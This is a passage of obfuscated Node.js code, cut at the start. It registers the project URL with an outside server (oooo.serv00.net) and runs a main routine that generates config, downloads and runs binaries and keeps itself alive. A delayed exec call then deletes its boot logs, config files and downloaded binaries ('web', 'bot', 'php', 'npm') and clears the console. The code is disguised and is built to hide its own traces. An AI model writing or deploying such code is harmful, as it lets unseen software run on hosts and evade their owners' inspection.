axios[_0x435b71(0x173)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x435b71(0x172)}}),console['log'](_0x435b71(0x150));}catch(_0x42f882){console[_0x435b71(0x159)](_0x435b71(0x180),_0x42f882['message']);}}function cleanUpLater(){setTimeout(()=>{const _0x371db7=_0x2e04,_0xd5908e=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath,path[_0x371db7(0x1d8)](FILE_PATH,_0x371db7(0x1d7)),path[_0x371db7(0x1d8)](FILE_PATH,_0x371db7(0x1bf)),path['join'](FILE_PATH,'config.yaml')],_0x458212=process[_0x371db7(0x16c)]===_0x371db7(0x1b4)?_0x371db7(0x193)+_0xd5908e[_0x371db7(0x1d2)](fs['existsSync'])['join']('\x20')+_0x371db7(0x191):_0x371db7(0x188)+_0xd5908e[_0x371db7(0x1d2)](fs['existsSync'])[_0x371db7(0x1d8)]('\x20')+_0x371db7(0x1dc);exec(_0x458212,()=>{const _0x1c2e17=_0x371db7;console[_0x1c2e17(0x16e)](),console[_0x1c2e17(0x163)](_0x1c2e17(0x1be));});},0x15f90);}async function main(){const _0x339412=_0x486a23;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadAndRun(),await extractDomainAndGenerateLinks(),await keepAlive(),cleanUpLater();}catch(_0x52ea2f){console[_0x339412(0x159)](_0x339412(0x18c),_0x52ea2f);}}main(),app['listen'](PORT,()=>console[_0x486a23(0x163)](_0x486a23(0x1cd)+PORT+'!'));
